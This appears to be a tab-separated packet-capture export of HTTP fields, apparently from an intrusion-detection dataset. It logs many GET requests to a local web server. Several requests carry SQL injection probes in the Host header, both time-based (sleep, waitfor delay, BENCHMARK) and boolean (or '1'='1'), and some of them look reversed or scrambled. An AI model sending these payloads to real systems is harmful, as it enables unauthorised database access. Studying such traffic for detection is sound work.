http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	close										--B3%1D3%1+ro+192.168.1.104%27--%29%29+or+%271%27%3D%271%27%28%28%3B--%25%29%29%29+or+%271%27%3D%271%27%28%28%28%25%27%29%29+and+%271%27%3D%272%27%28%28%27%25%29%29%29+and+%271%27%3D%272%27%28%28%28--%25%27%29%29+and+%271%27%3D%271%27%28%28%27%3B--															1	http://--B3%1D3%1+ro+192.168.1.104%27--%29%29+or+%271%27%3D%271%27%28%28%3B--%25%29%29%29+or+%271%27%3D%271%27%28%28%28%25%27%29%29+and+%271%27%3D%272%27%28%28%27%25%29%29%29+and+%271%27%3D%272%27%28%28%28--%25%27%29%29+and+%271%27%3D%271%27%28%28%27%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										--B3%82%82%72%172%D3%72%172%+ro+92%92%52%--72%82%82%72%172%D3%72%172%+dna+92%92%72%52%--1D3%1+ro+52%82%72%172%D3%72%172%+dna+92%52%--B3%82%82%72%272%D3%72%172%+dna+92%92%--B3%1D3%1+ro+192.168.1.104%27--%25%29%29%29+and+%271%27%3D%271%27%28%28%28%3B--															1	http://--B3%82%82%72%172%D3%72%172%+ro+92%92%52%--72%82%82%72%172%D3%72%172%+dna+92%92%72%52%--1D3%1+ro+52%82%72%172%D3%72%172%+dna+92%52%--B3%82%82%72%272%D3%72%172%+dna+92%92%--B3%1D3%1+ro+192.168.1.104%27--%25%29%29%29+and+%271%27%3D%271%27%28%28%28%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										--B3%1D3%1+ro+192.168.1.104%27--%29%29+or+%271%27%3D%271%27%28%28%3B--%25%29%29%29+or+%271%27%3D%271%27%28%28%28%25%27%29%29%29+and+%271%27%3D%271%27%28%28%28%27%25+and+1%3D1--%25%27%29%29%29+and+%271%27%3D%271%27%28%28%28%27%3B--															1	http://--B3%1D3%1+ro+192.168.1.104%27--%29%29+or+%271%27%3D%271%27%28%28%3B--%25%29%29%29+or+%271%27%3D%271%27%28%28%28%25%27%29%29%29+and+%271%27%3D%271%27%28%28%28%27%25+and+1%3D1--%25%27%29%29%29+and+%271%27%3D%271%27%28%28%28%27%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29--															1	http://192.168.1.104+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										--72%401.1.861.291+or+1%3D1%3B--%29%29+and+%271%27%3D%272%27%28%28%3B--%25%29+and+%271%27%3D%271%27%28%25+or+1%3D1--%25%27%29%29+and+%271%27%3D%271%27%28%28%27--%25%29%29+or+%271%27%3D%271%27%28%28%3B--%25%29%29%29+and+%271%27%3D%272%27%28%28%28%3B--															1	http://--72%401.1.861.291+or+1%3D1%3B--%29%29+and+%271%27%3D%272%27%28%28%3B--%25%29+and+%271%27%3D%271%27%28%25+or+1%3D1--%25%27%29%29+and+%271%27%3D%271%27%28%28%27--%25%29%29+or+%271%27%3D%271%27%28%28%3B--%25%29%29%29+and+%271%27%3D%272%27%28%28%28%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										--72%401.1.861.291+or+1%3D1%3B--%29%29+and+%271%27%3D%272%27%28%28%3B--%25%29+and+%271%27%3D%271%27%28%25+or+1%3D1--%25%27%29%29+and+%271%27%3D%271%27%28%28%27--%25%29%29+or+%271%27%3D%271%27%28%28%3B--%25%29%29%29+and+%271%27%3D%271%27%28%28%28%3B--															1	http://--72%401.1.861.291+or+1%3D1%3B--%29%29+and+%271%27%3D%272%27%28%28%3B--%25%29+and+%271%27%3D%271%27%28%25+or+1%3D1--%25%27%29%29+and+%271%27%3D%271%27%28%28%27--%25%29%29+or+%271%27%3D%271%27%28%28%3B--%25%29%29%29+and+%271%27%3D%271%27%28%28%28%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										--B3%1D3%1+ro+192.168.1.104%27--%29%29+or+%271%27%3D%271%27%28%28%3B--%25%29%29%29+or+%271%27%3D%271%27%28%28%28%25%27%29%29%29+and+%271%27%3D%271%27%28%28%28%27%25+and+1%3D2--%25%27+and+%271%27%3D%271%3B--%25%29%29+and+%271%27%3D%271%27%28%28%3B--															1	http://--B3%1D3%1+ro+192.168.1.104%27--%29%29+or+%271%27%3D%271%27%28%28%3B--%25%29%29%29+or+%271%27%3D%271%27%28%28%28%25%27%29%29%29+and+%271%27%3D%271%27%28%28%28%27%25+and+1%3D2--%25%27+and+%271%27%3D%271%3B--%25%29%29+and+%271%27%3D%271%27%28%28%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104+and+sleep%285%29															1	http://192.168.1.104+and+sleep%285%29/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104+and+sleep%285%29%3B--															1	http://192.168.1.104+and+sleep%285%29%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104+and+waitfor+delay+%270%3A0%3A5%27%3B--															1	http://192.168.1.104+and+waitfor+delay+%270%3A0%3A5%27%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29															1	http://192.168.1.104+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29%3B--															1	http://192.168.1.104+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104+and+waitfor+delay+%270%3A0%3A5%27															1	http://192.168.1.104+and+waitfor+delay+%270%3A0%3A5%27/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104+and+sleep%285%29--															1	http://192.168.1.104+and+sleep%285%29--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104+and+waitfor+delay+%270%3A0%3A5%27--															1	http://192.168.1.104+and+waitfor+delay+%270%3A0%3A5%27--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27+and+sleep%285%29%3B--															1	http://192.168.1.104%27+and+sleep%285%29%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27+and+sleep%285%29															1	http://192.168.1.104%27+and+sleep%285%29/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29															1	http://192.168.1.104%27+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29+and+sleep%285%29--															1	http://192.168.1.104%27%29%29+and+sleep%285%29--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27+and+waitfor+delay+%270%3A0%3A5%27															1	http://192.168.1.104%27+and+waitfor+delay+%270%3A0%3A5%27/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29--															1	http://192.168.1.104%27+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27+and+sleep%285%29--															1	http://192.168.1.104%27+and+sleep%285%29--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29															1	http://192.168.1.104%27%29%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29%3B--															1	http://192.168.1.104%27%29%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29--															1	http://192.168.1.104%27%29%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29+and+sleep%285%29															1	http://192.168.1.104%27%29%29+and+sleep%285%29/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27+and+waitfor+delay+%270%3A0%3A5%27--															1	http://192.168.1.104%27+and+waitfor+delay+%270%3A0%3A5%27--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27+and+waitfor+delay+%270%3A0%3A5%27%3B--															1	http://192.168.1.104%27+and+waitfor+delay+%270%3A0%3A5%27%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29+and+waitfor+delay+%270%3A0%3A5%27%3B--															1	http://192.168.1.104%27%29%29+and+waitfor+delay+%270%3A0%3A5%27%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29%3B--															1	http://192.168.1.104%27+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29+and+sleep%285%29%3B--															1	http://192.168.1.104%27%29%29+and+sleep%285%29%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29+and+waitfor+delay+%270%3A0%3A5%27															1	http://192.168.1.104%27%29%29+and+waitfor+delay+%270%3A0%3A5%27/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29%29+and+sleep%285%29															1	http://192.168.1.104%27%29%29%29+and+sleep%285%29/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29+and+waitfor+delay+%270%3A0%3A5%27--															1	http://192.168.1.104%27%29%29+and+waitfor+delay+%270%3A0%3A5%27--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29															1	http://192.168.1.104%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29%29+and+waitfor+delay+%270%3A0%3A5%27%3B--															1	http://192.168.1.104%27%29%29%29+and+waitfor+delay+%270%3A0%3A5%27%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%29+and+sleep%285%29%3B--															1	http://192.168.1.104%29+and+sleep%285%29%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29%3B--															1	http://192.168.1.104%27%29%29%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29%3B--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%29%29+and+sleep%285%29															1	http://192.168.1.104%29%29+and+sleep%285%29/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29															1	http://192.168.1.104%27%29%29%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29--															1	http://192.168.1.104%27%29%29%29+and+1+in+%28select+BENCHMARK%2820000000%2CMD5%28CHAR%2897%29%29%29%29--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29%29+and+sleep%285%29--															1	http://192.168.1.104%27%29%29%29+and+sleep%285%29--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%27%29%29%29+and+waitfor+delay+%270%3A0%3A5%27															1	http://192.168.1.104%27%29%29%29+and+waitfor+delay+%270%3A0%3A5%27/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%29+and+sleep%285%29--															1	http://192.168.1.104%29+and+sleep%285%29--/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104%29+and+sleep%285%29															1	http://192.168.1.104%29+and+sleep%285%29/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
																	close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																							/web
